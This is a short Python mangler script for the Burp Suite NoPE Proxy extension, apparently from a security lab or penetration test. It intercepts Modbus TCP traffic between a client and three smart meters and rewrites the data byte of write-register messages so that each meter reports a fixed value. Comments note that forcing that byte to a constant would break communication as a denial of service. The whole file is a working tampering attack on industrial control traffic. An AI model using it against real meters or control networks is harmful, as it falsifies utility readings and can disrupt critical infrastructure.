'''
This script is used in tandum with Burpsuite extension NoPE Proxy found: https://github.com/summitt/Burp-Non-HTTP-Extension

It is to be used as a python mangler script which changes the bytes transmitted from the client to the server
via modbus,

It changes the smart meter values to 1, 2, 3 for each respective smart meter
'''

def mangle(input, isC2S):
	if isC2S:
		var = list(input)
		print(list(input))

		'''
		When monitoring the communication via tcp,
		each response from client to server was exactly 12 bytes in length

		The 7th byte i.e. var[6] was seen to reference a particular slave device

		The 12th byte in the communication was determined to be the byte which transmitted data between
		the devices.

		The script below changes SM values to

		SM_1 = 1
		SM_2 = 2
		SM_3 = 3
		'''

		#Smart meter 1 change output value response
		if var[5] == 6 and var[6] == 1 and var[7] == 6:
			var[11] = 1
			print(var)

		#Smart meter 2 change output value response
		if var[5] == 6 and var[6] == 2 and var[7] == 6:
			var[11] = 2
			print(var)

		#Smart meter 3 change output value respone
		if var[5] == 6 and var[6] == 3 and var[7] == 6:
			var[11] = 3
			print(var)

		'''
		Since var[11] contains the transmission data, any verification checks are also sent through this byte
		changing this to a constant should DoS communication between devices
		'''

		#var[11] = 1

		
		if var[11] != 1 and var[11] != 0:
			print('Var 5 = ' + str(var[5]) + ', Var 6 = ' + str(var[6])+ ', Var 7 = ' + str(var[7]))
		
		output = bytearray(var)
		print(output)
		return output
	return input
